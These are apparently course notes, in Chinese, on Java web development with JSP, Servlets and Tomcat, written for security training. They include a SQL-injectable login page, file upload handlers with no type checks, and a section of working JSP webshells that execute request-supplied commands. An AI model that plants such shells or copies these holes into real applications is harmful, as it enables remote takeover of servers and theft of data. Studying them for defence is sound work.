[TOC]



# ==JavaWeb开发Servlet和JSP==

教材内容

[Tomcat 8.5 下载、安装、启动及各种问题_tomcat8.5-CSDN博客](https://blog.csdn.net/m0_61814277/article/details/140898682)

[下载Apache官网commons-fileupload.jar和 commons-io.jar包_commons-fileupload-1.5.jar下载-CSDN博客](https://blog.csdn.net/Clown_pan/article/details/105145691)

#### 一、在Idea中创建一个Web项目：

1、先创建一个普通的Java项目

![img](https://gitee.com/ymq_typroa/typroa/raw/main/202308230148711.png)

![image-20250108162121156](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108162121156.png)

如果使用Tomcat的版本较低，建议选择JDK1.8版本。然后指定项目名称和路径：

![image-20230823015017639](https://gitee.com/ymq_typroa/typroa/raw/main/202308230150678.png)

2、在项目上右键添加框架

![image-20230823021502346](https://gitee.com/ymq_typroa/typroa/raw/main/202308230215378.png)

选择Web Application，其他保持默认：

![image-20230823021532962](https://gitee.com/ymq_typroa/typroa/raw/main/202308230215999.png)

此时，会在项目目录下创建一个web的目录，下有WEB-INF目录和一个web.xml文件（用于配置Web项目）。

3、配置项目目录和库

（1）在WEB-INF目录下创建两个新的目录：classes和lib （目录名称不能随意取，只能是这两个）

（2）设置编译后的文件输出位置为classes目录（Tomcat从该目录下加载.class文件）

![image-20230823022025180](https://gitee.com/ymq_typroa/typroa/raw/main/202308230220227.png)

（3）将lib目录添加为项目依赖

![image-20230823022317377](https://gitee.com/ymq_typroa/typroa/raw/main/202308230223424.png)

选择为Jar Directory：

![image-20230823022350951](https://gitee.com/ymq_typroa/typroa/raw/main/202308230223980.png)

4、配置Tomcat服务器

在Run菜单下选择”Edit Configurations“菜单，并添加Tomcat服务器如下：

![image-20230823022750042](https://gitee.com/ymq_typroa/typroa/raw/main/202308230227091.png)

![image-20250108213637472](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108213637472.png)

![image-20250108215207501](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108215207501.png)

后来我访问的时候发现，URL地址那里自动变成了 JavaWeb，然后我一想记起来，我在下一步的Artifact中填写了网站的访问路径！！！

添加Artifact，定义网站访问路径：

![image-20230823023029897](https://woniumd.oss-cn-hangzhou.aliyuncs.com/security/dengqiang/202308230230943.png)

![image-20250108213802784](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108213802784.png)

5、运行Tomcat，实现访问：

在工具栏上启动Tomcat：

![image-20230823023215870](https://gitee.com/ymq_typroa/typroa/raw/main/202308230232898.png)

或者在视图窗口中启动Tomcat：

![image-20230823023256981](https://gitee.com/ymq_typroa/typroa/raw/main/202308230232011.png)

访问 http://127.0.0.1:8088/JavaWeb，如果成功访问，则以上配置正确：

![image-20230823023402694](https://gitee.com/ymq_typroa/typroa/raw/main/202308230234726.png)

> 参考资料： https://blog.csdn.net/l_zl2021/article/details/126503684

6、将Mysql和FastJson的jar包添加到lib目录中

将MySQL驱动和FastJson框架对应的jar包添加到lib目录中，用于后续处理MySQL数据库和操作JSON数据格式。然后将创建的lib目录添加到Library库中，可以在lib目录上右键，Add as Library，然后查看 Project Structure，可以看到对lib目录的依赖：

![image-20230823023707045](https://gitee.com/ymq_typroa/typroa/raw/main/202308230237079.png)

![image-20250108214032253](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108214032253.png)

同时需要将编译后的文件输出到指定的 classes 目录中去

![image-20250108214307375](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108214307375.png)

7、为了能正常创建Servlet，配置Source Roots，并添加Tomat库：

其实是添加一个对tomcat 的依赖

![image-20230823024345018](https://gitee.com/ymq_typroa/typroa/raw/main/202308230243064.png)

> ![image-20250108214500778](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108214500778.png)
>
> ![image-20250108214520459](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108214520459.png)

然后确认 source roots

![image-20230823023953523](https://gitee.com/ymq_typroa/typroa/raw/main/202308230239566.png)

![image-20250108214722601](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108214722601.png)

此时开始启动tomcat

![image-20250108214911243](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108214911243.png)

![image-20250108215527973](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108215527973.png)

哦耶~

接下来，如果需要更改文件的同时，tomcat访问的页面内容也会实时更新，我们需要做以下配置

![image-20250108215806813](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250108215806813.png)

确保在src目录或任意包目录下新建文件，右键中存在”Servlet“类型。

![image-20230823024442199](https://gitee.com/ymq_typroa/typroa/raw/main/202308230244239.png)

8、全局设置自动编译项目

![image-20230823030236157](https://gitee.com/ymq_typroa/typroa/raw/main/202308230302223.png)

但是，在调试过程中，如果代码经常写错，自动编译反而会带来一些麻烦。

9、可选：添加Jetty 9.4 Server（与Tomcat相同功能，如果已经配置好Tomcat，Jetty可以不再配置）。

![image-20230822233825745](https://gitee.com/ymq_typroa/typroa/raw/main/202308222338794.png)

> 在 IDEA 中使用可视化数据库管理工具
>
> ![image-20250109153632135](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250109153632135.png)
>
> 根据自己的数据库类型选择一个并创建，由于我这里使用的是 xampp 自带的数据库，他是 MariaDB版本的，所以我在这里就选择MariaDB
>
> ![image-20250109153654508](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250109153654508.png)
>
> ![image-20250109154219128](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250109154219128.png)
>
> 如果遇到如下情况，请点击 download 直接下载就好了
>
> ![image-20250109154346859](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250109154346859.png)
>
> 但是！！！
>
> 我使用了 MariaDB 之后，竟然给我报错 `[42000][-1] (conn=4) invalid fetch size` 查阅了一下，竟然是数据库版本的问题，应该切换回 MySQL，难怪为什么强哥这次也没有选择 MariaDB，我还奇怪呢，以前他都会强调版本，这次竟然直接用了 MySQL
>
> 所以我重新使用 MySQL，放弃MariaDB
>
> ![image-20250109155351701](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250109155351701.png)
>
> 在右侧使用 SQL scripts
>
> ![image-20250109155720337](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250109155720337.png)
>
> ok，成了，果然
>
> ![image-20250109155618927](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250109155618927.png)



#### 二、在JSP页面中进行开发

1、编辑index.jsp文件，实现登录界面

```jsp
<%--
  Created by IntelliJ IDEA.
  User: hp
  Date: 2025/1/8
  Time: 21:29
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
  <head>
    <title>JavaWeb首页</title>
    <style>
      #main{
        width: 400px;
        height: 300px;
        margin: auto;
        margin-top: 100px;
        text-align: center;
      }
      button{
        background-color: darksalmon;
      }
    </style>
  </head>
  <body>
    <div id="main">
      <form action="./login.jsp" method="post">
        用户名: <input type="text" value="woniu" name="username" /></br></br>
        密&nbsp;&nbsp;&nbsp;码: <input type="password" value="123456" name="password" /></br></br>
        <button type="submit" >登录</button>
      </form>
    </div>
  </body>
</html>
```

> ```jsp
> <%--
>   Created by IntelliJ IDEA.
>   User: hp
>   Date: 2025/1/8
>   Time: 21:29
>   To change this template use File | Settings | File Templates.
> --%>
> <%@ page contentType="text/html;charset=UTF-8" language="java" %>
> <html>
>   <head>
>     <title>JavaWeb首页</title>
>     <style>
>       #main{
>         width: 400px;
>         height: 300px;
>         margin: auto;
>         margin-top: 100px;
>         text-align: center;
>       }
>       button{
>         background-color: darksalmon;
>       }
>     </style>
>   </head>
>   <body>
>     <div id="main">
>       <form action="./login.jsp" method="post">
>         用户名: <input type="text" value="woniu" name="username" /></br></br>
>         密&nbsp;&nbsp;&nbsp;码: <input type="password" value="123456" name="password" /></br></br>
>         <button type="submit" >登录</button>
>       </form>
>     </div>
>   </body>
> </html>
> 
> ```
>
> 

访问效果如下：

![image-20230823031035440](https://gitee.com/ymq_typroa/typroa/raw/main/202308230310471.png)

![image-20250109153039236](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250109153039236.png)

2、在web目录下新建login.jsp，实现登录验证

```jsp
<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.DriverManager" %>
<%@ page import="java.sql.PreparedStatement" %>
<%@ page import="java.sql.ResultSet" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
    <head>    
        <title>登录验证</title>
    </head>
    <body>  
        <%    
            response.setContentType("text/html; charset=utf-8");    // 设置响应编码为utf-8    
            String username = request.getParameter("username");    
            String password = request.getParameter("password");    
            try {      
                Class.forName("com.mysql.jdbc.Driver").newInstance();      
                Connection conn = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/woniunote?user=root&password=123456&useUnicode=true&characterEncoding=UTF8");      
                String sql = "select * from user where username=?";      
                PreparedStatement ps = conn.prepareStatement(sql);      
                ps.setString(1, username);      
                ResultSet rs = ps.executeQuery();      
                rs.next();      
                if (rs.getString("password").equals(password)) {        
                    response.getWriter().println("登录成功");      
                }      
                else {        
                    response.getWriter().println("登录失败");      
                }
            }    catch(Exception e) {      
                e.printStackTrace();    
            }  
        %>
    </body>
</html>
```

> ```jsp
> <%@ page import="java.sql.Connection" %>
> <%@ page import="com.mysql.jdbc.Driver" %>
> <%@ page import="java.sql.DriverManager" %>
> <%@ page import="java.sql.Statement" %>
> <%@ page import="java.sql.ResultSet" %><%--
>   Created by IntelliJ IDEA.
>   User: hp
>   Date: 2025/1/8
>   Time: 22:26
>   To change this template use File | Settings | File Templates.
> --%>
> <%@ page contentType="text/html;charset=UTF-8" language="java" %>
> <html>
> <head>
>     <title>登录验证</title>
> </head>
> <body>
>     <%
>         String username = request.getParameter("username");
>         String password = request.getParameter("password");
>         // 从发送到该页面的请求中获取参数
> 
> //        response.getWriter().println("Your username is " + username + " , password is " + password);
>         // 给出响应内容，使用该函数并且输出到页面
>         response.setContentType("text/html; charset=utf-8");  // 将该页面的编码设置为 utf-8 的编码
> 
>         // 操作数据库来完成登录
>         Class.forName("com.mysql.jdbc.Driver").newInstance();  //在旧版本的Java中手动加载并注册MySQL JDBC驱动
>         Connection conn = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/woniunote?user=root&password=p-0p-0p-0&useUnicode=true&characterEncoding=UTF8");
>         // 上面的这句代码使用了 jdbc 驱动来连接 mysql
>         Statement statement = conn.createStatement();  // 创建一个可以执行SQL语句的对象叫做statement
>         String sql = "select * from users where username='"+username+"' and password='"+password+"'";  //这种查询语句是有漏洞的，在这里只是作为测试使用，方便简单点
> 
>         // 将sql语句构造好之后，我们使用 statement 对象去执行，查询语句的执行结果将放在ResultSet结果集当中
>         ResultSet rs = statement.executeQuery(sql);
> 
>         rs.next();  // 让rs指到结果集中的第一行去
>         if(rs.getRow() == 1){
>             HttpSession mysession = request.getSession();
>             // 登录成功之后进行session的处理
>             mysession.setAttribute("islogin","1");  // 给session赋值了一个属性
> //            response.getWriter().println("SessionID: " + request.getRequestedSessionId() + " , islogin: " + mysession.getAttribute("islogin"));
> 
>             //对 Coocie 进行操作
>             Cookie cookie = new Cookie("username",username);
> //            cookie.setDomain("/JavaWeb-Tomcat");
>             cookie.setMaxAge(24*3600*7);
>             cookie.setHttpOnly(true);
>             response.addCookie(cookie);  // 将设置的 cookie 字段添加在服务器的响应中
> 
>             response.getWriter().println("<script>alert('登录成功，等待页面跳转'); location.href='./list.jsp?maxid=10';</script>;");
> 
>         }
>         else{
>             response.getWriter().println("<script>alert('登录失败，请重新操作'); location.href='./index.jsp'</script>;");
>         }
>     %>
> </body>
> </html>
> ```
>
> 

此时，登录功能得以正常实现，整个操作模式与PHP完全一样，没有任何差别。

3、配置自动更新JSP页面内容

![image-20230823030924762](https://gitee.com/ymq_typroa/typroa/raw/main/202308230309856.png)

配置后，每次更新JSP页面源代码时，将不需要重启Tomcat服务器。

4、在JSP页面中填充数据库内容

```jsp
<table width="800" align="center" border="1">    
    <tr>        
        <td>用户ID</td>        
        <td>用户名</td>        
        <td>密码</td>        
        <td>手机号</td>    
    </tr>    
    <%    
    Connection conn = DBUtil.getConnection();    // DBUtil类中封装一个静态方法用于建议数据库连接    
    String maxid = request.getParameter("id");    
    String sql = "select * from user where userid<?";    
    try {        
        PreparedStatement ps = conn.prepareStatement(sql);        
        ps.setString(1, maxid);        
        ResultSet rs = ps.executeQuery();        
        String content = "";        
        while (rs.next()) {            
            content += "<tr>";            
            content += "<td>" + rs.getString("userid") + "</td>";            
            content += "<td>" + rs.getString("username") + "</td>";            
            content += "<td>" + rs.getString("password") + "</td>";            
            content += "<td>" + rs.getString("role") + "</td>";            
            content += "</tr>";        
        }        
        pageContext.setAttribute("content", content);    
    }    catch (Exception e) {        
        e.printStackTrace();    
    }    
    %>    
    ${content}
</table>
```

访问效果如下：

![image-20230823031656064](https://gitee.com/ymq_typroa/typroa/raw/main/202308230316113.png)

为了填充表格，也可以这样：

```jsp
<%..前面代码同上，略...String content = "";while (rs.next()) {    int userid = rs.getInt("userid");    String username = rs.getString("username");    String password = rs.getString("password");    String role = rs.getString("role");    content += "<tr>";    content += "<td>" + userid + "</td>";    content += "<td>" + username + "</td>";    content += "<td>" + password + "</td>";    content += "<td>" + role + "</td>";    content += "</tr>";}%><%=content%>    // 直接在HTML页面中引用JSP变量
```

HTML默认表格样式确实较丑，可以使用CSS进行样式美化。

> 说白了，填充内容就是 list.jsp
>
> ```jsp
> <%@ page import="java.sql.*" %><%--
>   Created by IntelliJ IDEA.
>   User: hp
>   Date: 2025/1/9
>   Time: 18:06
>   To change this template use File | Settings | File Templates.
> --%>
> <%@ page contentType="text/html;charset=UTF-8" language="java" %>
> <html>
> <head>
>     <title>用户列表</title>
>     <style>
>         td {
>             border: solid 1px black;  /*solid 表示实线*/
>             border: dashed 1px black;  /*dashed 表示虚线*/
>             border-spacing: 0px;
>             height: 30px;
>             text-align: center;
>         }
>     </style>
> </head>
> <body>
>     <table width="800px" align="center" style="border: solid 2px black">
>         <tr>
>             <td>编号</td>
>             <td>用户名</td>
>             <td>密码</td>
>             <td>角色</td>
>         </tr>
>     <%
>         // 判断用户是否已经登录，使用 session 判断,使用 try...catch...处理异常
>         HttpSession mysession = request.getSession();
> //        response.getWriter().println(mysession.getAttribute("islogin"));  //null 如果没有登录的话结果就是null
>         try {
>             if(!mysession.getAttribute("islogin").equals("1")){
>                 return;
>             }
>         }
>         catch (Exception e){
>             // 如果此时用户未登录过，导致代码出现异常，那么我们就处理该异常为跳转到登录页面
> //            e.printStackTrace();  // 使用该代码时异常会抛在编译器的output中
>             response.getWriter().println("<script>alert('请先登录'); location.href='./index.jsp'</script>");
>             return;
>         }
> 
>         //当然，也可以使用 session 对象的内容来做异常处理
> //        response.getWriter().println(request.getSession() + "</br>");  //org.apache.catalina.session.StandardSessionFacade@58ff4f17
> //        response.getWriter().println(request.getSession().getAttribute("islogin")+"</br>");  //null
> //        response.getWriter().println(mysession+"</br>");  //org.apache.catalina.session.StandardSessionFacade@58ff4f17
> //        response.getWriter().println(mysession.getAttribute("islogin"+"</br>"));  //null
> //        //上面四句代码后的注释，是用户未登录的情况下的值，说明，即使用户未登录，也会分配 session，这是因为 Session 机制的问题，只要是没有携带session的请求，服务器都会给该请求的客户端分配一个新的session
> //        if(!mysession.getAttribute("islogin").equals("1")){  //这个条件永远都是错的，是因为该判断条件会出现异常
> //        if((mysession.getAttribute("islogin") == null)){
> //            response.getWriter().println("<script>alert('请先登录');location.href='./index.jsp'</script>");
> //            return;
> //        }
> 
>         //Cookie 的操作
>         Cookie[] cookies = request.getCookies();
>         for(int i = 0;i<cookies.length;++i){
>             System.out.println(cookies[i].getName() + " -- " + cookies[i].getValue());
>             // 在 jsp 里面使用 Java的sout来输出内容，内容只会输出到 output 的命令行控制台里面，不会输出到前端页面
>         }
> 
> 
>         String maxid = request.getParameter("maxid");  //该方法既可以从GET请求中获取参数，也可以从POST请求中去获取
> 
>         Class.forName("com.mysql.jdbc.Driver").newInstance();  //在旧版本的Java中手动加载并注册MySQL JDBC驱动
>         Connection conn = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/woniunote?user=root&password=p-0p-0p-0&useUnicode=true&characterEncoding=UTF8");
>         // 上面的这句代码使用了 jdbc 驱动来连接 mysql
> //        Statement statement = conn.createStatement();  // 创建一个可以执行SQL语句的对象叫做statement
> //        String sql = "select * from users where userid<"+maxid;
>         // 将sql语句构造好之后，我们使用 statement对象去执行，查询语句的执行结果将放在ResultSet结果集当中
> //        ResultSet rs = statement.executeQuery(sql);
> //        这三句代码我在下方使用预处理功能将其替换掉了
> 
>         //还可以使用PreparedStatement来对SQL语句进行预处理
>         String sql = "select * from users where userid < ?";
>         PreparedStatement ps = conn.prepareStatement(sql);  // 创建一个可以预处理SQL语句的对象叫做ps
>         ps.setString(1,maxid);  // 由于上面定义maxid时就用的是String定义的，所以这里使用的就是 setString()。其意思是，把 maxid 的值，复制到第一个 ? 所在位置
>         ResultSet rs = ps.executeQuery(); // 由于在上面已经进行了SQL语句的预处理，所以在这里 executeQuery() 时，就可以不传参数
> 
> 
>         String content = "";
>         while(rs.next()){
>             int userid = rs.getInt("userid");
>             String username = rs.getString("username");
>             String password = rs.getString("password");
>             String role = rs.getString("role");
> //            response.getWriter().printf("编号 %d,用户名 %s,密码 %s,角色 %s</br>",userid,username,password,role);  // 这里使用 print格式化输出
>             //接下来使用给内容修建一个表格
>             content += "<tr>";
>             content += "<td>"+userid+"</td>";
>             content += "<td>"+username+"</td>";
>             content += "<td>"+password+"</td>";
>             content += "<td>"+role+"</td>";
>             content += "</tr>";
>         }
>     %>
>         <%=content%>
>     </table>
> </body>
> </html>
> 
> ```

5、页面跳转

```jsp
response.sendRedirect("userlist.do?userid=10"); 
// 也可以使用响应写JS代码的方式进行跳转
response.getWriter().println("<script>alert('登录失败，请重新登录'); location.href='index.jsp';</script>");
```

#### 三、 定义用户操作的Servlet接口

1、新建UserServlet

![image-20230823024615840](https://gitee.com/ymq_typroa/typroa/raw/main/202308230246895.png)

2、构造一个用户登录的请求接口

直接在doPost方法中编写以下代码，实现用户登录：

```jsp
<%@ page import="java.sql.Connection" %>
<%@ page import="com.mysql.jdbc.Driver" %>
<%@ page import="java.sql.DriverManager" %>
<%@ page import="java.sql.Statement" %>
<%@ page import="java.sql.ResultSet" %><%--
  Created by IntelliJ IDEA.
  User: hp
  Date: 2025/1/8
  Time: 22:26
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>登录验证</title>
</head>
<body>
    <%
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        // 从发送到该页面的请求中获取参数
//        response.getWriter().println("Your username is " + username + " , password is " + password);
        // 给出响应内容，使用该函数并且输出到页面
        response.setContentType("text/html; charset=utf-8");  // 将该页面的编码设置为 utf-8 的编码
        // 操作数据库来完成登录
        Class.forName("com.mysql.jdbc.Driver").newInstance();  //在旧版本的Java中手动加载并注册MySQL JDBC驱动
        Connection conn = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/woniunote?user=root&password=p-0p-0p-0&useUnicode=true&characterEncoding=UTF8");
        // 上面的这句代码使用了 jdbc 驱动来连接 mysql
        Statement statement = conn.createStatement();  // 创建一个可以执行SQL语句的对象叫做statement
        String sql = "select * from users where username='"+username+"' and password='"+password+"'";  //这种查询语句是有漏洞的，在这里只是作为测试使用，方便简单点
        // 将sql语句构造好之后，我们使用 statement 对象去执行，查询语句的执行结果将放在ResultSet结果集当中
        ResultSet rs = statement.executeQuery(sql);
        rs.next();  // 让rs指到结果集中的第一行去
        if(rs.getRow() == 1){
            HttpSession mysession = request.getSession();
            // 登录成功之后进行session的处理
            mysession.setAttribute("islogin","1");  // 给session赋值了一个属性
            //对 Coocie 进行操作
            Cookie cookie = new Cookie("username",username);
            cookie.setMaxAge(24*3600*7);
            cookie.setHttpOnly(true);
            response.addCookie(cookie);  // 将设置的 cookie 字段添加在服务器的响应中
            response.getWriter().println("<script>alert('登录成功，等待页面跳转'); location.href='./list.jsp?maxid=10';</script>;");
        }
        else{
            response.getWriter().println("<script>alert('登录失败，请重新操作'); location.href='./index.jsp'</script>;");
        }
    %>
</body>
</html>
```

> 此时，还必须要在web.xml中定义URL和Servlet之间的关系映射，才能实现访问。
>
> ```jsp
> <servlet>    <servlet-name>UserServlet</servlet-name>    <servlet-class>com.woniuxy.basic.UserServlet</servlet-class></servlet><servlet-mapping>    <servlet-name>UserServlet</servlet-name>    <url-pattern>/user.do</url-pattern>     <!-- 这是URL地址，表示访问此URL地址时，将访问UserServlet --></servlet-mapping>
> ```
>

在Firefox中进行登录访问，结果如下：

![image-20230823030441435](https://gitee.com/ymq_typroa/typroa/raw/main/202308230304474.png)

说明Servlet接口开发完成，可以实现登录验证，也可以正确地处理请求和响应。

3、让Servlet结合JSP实现用户列表功能

Servlet代码：

```java
@Overrideprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {    
	String userid = request.getParameter("userid");    
    String sql = "select * from user where userid<?";    
    Connection conn = DBUtil.getConnection();    
    try {        
        PreparedStatement ps = conn.prepareStatement(sql);        
        ps.setString(1, userid);        
        ResultSet rs = ps.executeQuery();        
        List<Map> list = new ArrayList<>();        
        while (rs.next()) {            
            Map map = new HashMap();            
            map.put("userid", rs.getString("userid"));            
            map.put("username", rs.getString("username"));            
            map.put("password", rs.getString("password"));            
            map.put("role", rs.getString("role"));            
            list.add(map);        
        }        
        request.setAttribute("users", list);        
        // 在JSP页面中直接可以访问到users        
        request.getRequestDispatcher("user.jsp").forward(request, response);    
        // 后续操作转给JSP页面处理        
        conn.close();    
    }    
    catch (Exception e) {        
        e.printStackTrace();    
    }
}
```

JSP页面代码：

```jsp
<%@ page isELIgnored="false" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<table width="800" align="center" border="1">    
    <tr>        
        <td>用户ID</td>        
        <td>用户名</td>        
        <td>密码</td>        
        <td>手机号</td>    
    </tr>    
    <c:forEach items="${users}" var="user">        
        <tr>            
            <td>${user.userid}</td>            
            <td>${user.username}</td>            
            <td>${user.password}</td>            
            <td>${user.role}</td>        
        </tr>    
    </c:forEach>
</table>
```

上述使用JSP的标签库对users进行遍历和渲染，此操作与直接在JSP页面中编写Java代码有所不同。

#### 四、管理Session和Cookie

如果登录成功，需要保存Session变量，代码如下：

```java
HttpSession session = request.getSession();
session.setAttribute("islogin", "1");
```

如果需要处理Cookie，代码如下：

```java
Cookie cookie = new Cookie("username", username);
cookie.setHttpOnly(true);
cookie.setMaxAge(3600);
response.addCookie(cookie);
```

读取Session和Cookie的API为：`request.getSession().getAttribute("username") 和 request.getCookies()`

![image-20250110120135844](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250110120135844.png)

原先的Cookie是以7EB7结尾的，过期了之后，服务器重新给客户端分配了一个以4145结尾的Cookie，之后的请求，均以4145结尾的Cookie为准。

![image-20250110120307116](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250110120307116.png)

![image-20250110120330637](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250110120330637.png)

> 在处理session的过程中给我们经常会遇到 NullPointerException 空指针异常的问题。我是用如下代码进行举例
>
> ```jsp
> if(!mysession.getAttribute("islogin").equals("1")){
> 	response.getWriter().println("<script>alert('请先登录')</script>");
> 	return;
> }
> ```
>
> 如果用户没有登录过，也就是此时用户并没有服务器给他分配的sessionID，那么此时就会报错，空指针异常的额问题，但确实这种情况也合情合理，用户没登录，还想访问这个页面，这不就是异常情况吗，此时我们可以使用 try...catch...来处理，防止异常情况暴露在前端页面
>
> ```jsp
> try {
>     if(!mysession.getAttribute("islogin").equals("1")){
>         response.getWriter().println("<script>alert('请先登录')</script>");
>         return;
>     }
> }
> catch (Exception e){
>     // 如果此时用户未登录过，导致代码出现异常，那么我们就处理该异常为跳转到登录页面
>     response.sendRedirect("./index.jsp");
> }
> ```
>
> 当然，也可以不用 try...catch... 来解决，我们可以直接使用 session 对象来做判断
>
> ```jsp
> //当然，也可以使用 session 对象的内容来做异常处理
> if((mysession.getAttribute("islogin") == null)){
>     response.getWriter().println("<script>alert('请先登录');</script>");
>     return;
> }
> 
> 
> //response.getWriter().println(request.getSession() + "</br>");  //org.apache.catalina.session.StandardSessionFacade@58ff4f17
> //response.getWriter().println(request.getSession().getAttribute("islogin")+"</br>");  //null
> //response.getWriter().println(mysession+"</br>");  //org.apache.catalina.session.StandardSessionFacade@58ff4f17
> //response.getWriter().println(mysession.getAttribute("islogin"+"</br>"));  //null
> //上面四句代码后的注释，是用户未登录的情况下的值，说明，即使用户未登录，也会分配 session，这是因为 Session 机制的问题，只要是没有携带session的请求，服务器都会给该请求的客户端分配一个新的session
> //if(!mysession.getAttribute("islogin").equals("1"))  //这个条件永远都是错的，就算取出来的值不等于一，也无法进入if判断条件，因为会抛异常
> ```

#### 五、实现文件上传功能： 

> 这里扩展一下，数据请求头中的 Content-Type 
>
> ![image-20250110151422864](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250110151422864.png)
>
> 如图所示，该 Content-Type的值为 application/x-www-form-urlencoded
>
> 他表示提交的是一个文本型的POST请求，并且具备 key=value&key=value 这种类型的POST请求类型
>
> 如果是文件上传的话，那么请求头中该字段的值就会变为 multiparty/form-data（表单元素，有多种类型的值）

1、JSP页面，标准HTML页面

```jsp
<form action="upload.do" method="post" enctype="multipart/form-data">    
    选择文件: <input type="file" name="photo" />    
    <input type="text" value="woniu" name="username" /> <br/>    
    <input type="password" value="123456" name="password" /> <br/>    
    <input type="submit" value="上传" />
</form>
```

2、也可以使用AJAX提交

```jsp
<script type="text/javascript" src="jquery-3.4.1.min.js"></script>
<script>    
    function doReg() {        
        var username = $("#username").val();        
        var password = $("#password").val();        
        var data = new FormData();    // 带附件上传        
        data.append("username", username);        
        data.append("password", password);        
        data.append("photo",$("#photo").prop("files")[0]);        
        $.ajax({            
            url: 'upload.do',            
            type: 'POST',            
            data: data,            
            cache: false,            
            processData: false,            
            contentType: false,            
            success : function(data) {                
                window.alert(data);            
            }        
        });    
    }
</script>
<!-- HTML标签，不需要form表单包裹 -->
选择文件: <input type="file" id="photo" />
<input type="text" value="woniu" id="username" /> <br/>
<input type="password" value="123456" id="password" /> <br/>
<input type="button" value="上传" onclick="doReg()" />
```

3、后台UploadServlet源码

```java
package com.woniuxy.basic;
import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;
@WebServlet(name = "UploadServlet", value = "/UploadServlet")
@MultipartConfig      
// 此处必须要有此注解，否则无法成功运行
public class UploadServlet extends HttpServlet {    
    @Override    
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {    }    
    @Override    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        
        request.setCharacterEncoding("utf-8");        
        response.setContentType("text/html; charset=utf-8");        
        // 获取用户名和密码        
        String username = request.getParameter("username");        
        String password = request.getParameter("password");        
        // 获取文件对象        
        Part part = request.getPart("photo");        
        //通过Part对象得到上传的文件名        
        String filename = part.getSubmittedFileName();        
        System.out.println("上传的文件名:" + filename);        
        //得到文件存放的路径        
        String filepath = request.getServletContext().getRealPath("/upload");        
        System.out.println("文件存放的路径:" + filepath);        
        //上传文件到指定目录        
        part.write(filepath+"/"+filename);        
        response.getWriter().println("上传成功");    
    }
}
```

如果是在JSP页面中处理文件上传，则不能按照上述方法，必须配合common-io和common-fileupload进行，核心代码如下：

```java
request.setCharacterEncoding("utf-8");
response.setCharacterEncoding("UTF-8");
String savePath = request.getServletContext().getRealPath("/upload");
DiskFileItemFactory factory = new DiskFileItemFactory();
ServletFileUpload upload = new ServletFileUpload(factory);
try {    
    List<FileItem> items = upload.parseRequest(new ServletRequestContext(request));    
    for (FileItem item : items) {        
        if (!item.isFormField()) {            
            System.out.println("savePath = " + savePath);            
            item.write(new File(savePath + "/" + item.getName()));            
            response.getWriter().println("文件上传成功");        
        }        
        // 如果前端有混搭普通表单元素，则进行如下处理即可        
        else if (item.getFieldName().equals("username")){            
            response.getWriter().println("用户名为：" + item.getString());        
        }    
    }
} 
catch (Exception e) {    
    e.printStackTrace();
}
```

> 尝试一下，如果没有判断文件类型，是否可以实现木马植入？

#### 六、利用JSP实现一句话木马

1、无回显

```jsp
<%    
    String cmd = request.getParameter("cmd");    
    Runtime r = Runtime.getRuntime();    
    r.exec(cmd);    
    // 或使用ProcessBuilder    
    ProcessBuilder pb = new ProcessBuilder("calc.exe");       
    Process proc = pb.start();    
    // 使用PB时，如果存在参数，则需要分在多个字符串中    
    ProcessBuilder pb = new ProcessBuilder("whoami", "/user");   
%>
```

2、有回显

（1）使用Runtime对象：

```jsp
<%    
    InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();    
	InputStreamReader isr = new InputStreamReader(is, "gbk");    
	BufferedReader br = new BufferedReader(isr);    
	String line = br.readLine();    
	String content = "";    
	while (line != null){        
        line = br.readLine();        
        content += line + "<br/>";    
    }    
	response.getWriter().println(content);
%>
```

（2）使用ProcessBuilder对象

```java
<%
    ProcessBuilder pb=new ProcessBuilder("ipconfig");
	Process proc = pb.start();
	BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream(), "GBK"));
	String line = "";
	while ((line = br.readLine()) != null) {    
        System.out.println(line);
    }
%>
```

#### 七、将项目导出为War包

1、新增一个Artifact-War

![image-20230823163244465](https://gitee.com/ymq_typroa/typroa/raw/main/202308231632532.png)

2、Build Artifact

![image-20230823163354646](https://gitee.com/ymq_typroa/typroa/raw/main/202308231633694.png)

3、在目录中查看对应的war文件

通常位于：JavaWebDemo\out\artifacts\JavaWebDemo_war 目录中。